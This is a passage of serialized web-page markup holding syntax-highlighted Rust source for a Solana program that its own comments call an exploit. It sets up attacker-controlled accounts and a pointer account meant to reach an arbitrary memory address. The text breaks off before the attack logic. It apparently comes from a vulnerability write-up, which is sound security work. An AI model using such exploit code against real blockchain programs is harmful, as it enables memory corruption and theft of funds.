\"]}]\nea4:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nea5:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nea6:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nea7:[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}]\nea8:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nea9:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"account_info\"]}]\neaa:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\neab:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}]\neac:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nead:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\neae:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSele"])</script><script>self.__next_f.push([1,"ct\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\neaf:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\neb0:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"instruction\"]}]\neb1:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\neb2:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\neb3:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}]\neb4:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\neb5:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\neb6:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}]\neb7:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\neb8:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\neb9:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\neba:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\nebb:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nebc:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"program\"]}]\nebd:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nebe:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"invoke_signed\"]}]\nebf:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token t"])</script><script>self.__next_f.push([1,"oken\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nec0:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nec1:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\nec2:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    entrypoint\"]}]\nec3:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nec4:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nec5:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\nec6:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nec7:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"entrypoint\"]}]\nec8:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nec9:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\neca:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\necb:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\necc:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\necd:[\"$\",\"span\",\"code-segment-68\",{\"clas"])</script><script>self.__next_f.push([1,"sName\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nece:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"pubkey\"]}]\necf:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\ned0:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\ned1:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ned2:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ned3:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\ned4:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ned5:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\ned6:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\ned7:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ned8:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\ned9:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\neda:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nedb:[\"$\",\"span\",\"code-segment-83\",{\"className\":\""])</script><script>self.__next_f.push([1,"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"entrypoint!\"]}]\nedc:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nedd:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"process_instruction\"]}]\nede:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nedf:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nee0:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nee1:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\nee2:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\nee3:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nee4:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[0]: SWAP account controlled by ATTACKER, owned by this EXPLOIT program.\"]}]\nee5:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nee6:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\nee7:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nee8:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\""])</script><script>self.__next_f.push([1,",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[1]: POINTER account whose MemoryRegion will point to an arbitrary address.\"]}]\nee9:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\neea:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\neeb:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\neec:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[6]: LEVERAGE account controlled by ATTACKER, owned by this EXPLOIT program.\"]}]\need:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\neee:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\neef:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\nef0:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nef1:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\nef2:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nef3:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}]\nef4:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nef5:[\"$\",\"span\",\"c"])</script><script>self.__next_f.push([1,"ode-segment-111\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"process_instruction\"]}]\nef6:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nef7:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nef8:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\nef9:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    program_id\"]}]\nefa:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nefb:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nefc:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nefd:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\nefe:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\neff:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf00:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\nf01:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}]\nf02:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nf03:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf04:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"token token\",\"style\":{\""])</script><script>self.__next_f.push([1,"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nf05:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf06:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}]\nf07:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf08:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nf09:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf0a:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\nf0b:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _instruction_data\"]}]\nf0c:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nf0d:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf0e:[\"$\",\"span\",\"code-segment-136\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nf0f:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nf10:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nf11:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nf12:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nf13:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf14:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"bor"])</script><script>self.__next_f.push([1,"derRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\nf15:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nf16:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nf17:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf18:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\nf19:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf1a:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}]\nf1b:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf1c:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nf1d:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf1e:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\nf1f:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nf20:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\nf21:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}]\nf22:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nf23:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}]\nf24:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nf25:[\"$\",\"span\",\"code-segment-159\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nf26:[\"$\",\"span\",\"code-se"])</script><script>self.__next_f.push([1,"gment-160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf27:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\nf28:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf29:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"8\"]}]\nf2a:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf2b:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nf2c:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf2d:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\nf2e:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf2f:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nf30:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" swap_idx \"]}]\nf31:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nf32:[\"$\",\"span\",\"code-segment-172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf33:[\"$\",\"span\",\"code-segment-173\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\nf34:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nf35:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf36:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid "])</script><script>self.__next_f.push([1,"rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\nf37:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf38:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nf39:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pointer_idx \"]}]\nf3a:[\"$\",\"span\",\"code-segment-180\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nf3b:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf3c:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nf3d:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nf3e:[\"$\",\"span\",\"code-segment-184\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf3f:[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\nf40:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf41:[\"$\",\"span\",\"code-segment-187\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nf42:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" leverage_idx \"]}]\nf43:[\"$\",\"span\",\"code-segment-189\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nf44:[\"$\",\"span\",\"code-segment-190\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nf45:[\"$\",\"span\",\"code-segment-191\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"6\"]}]\nf46:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nf47:[\"$\",\"span\",\"code-segment-193\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nf48:[\"$\",\"span\",\"line-number--26\""])</script><script>self.__next_f.push([1,",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\nf49:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\nf4a:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nf4b:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Prepare LEVERAGE and SWAP accounts to set up memory 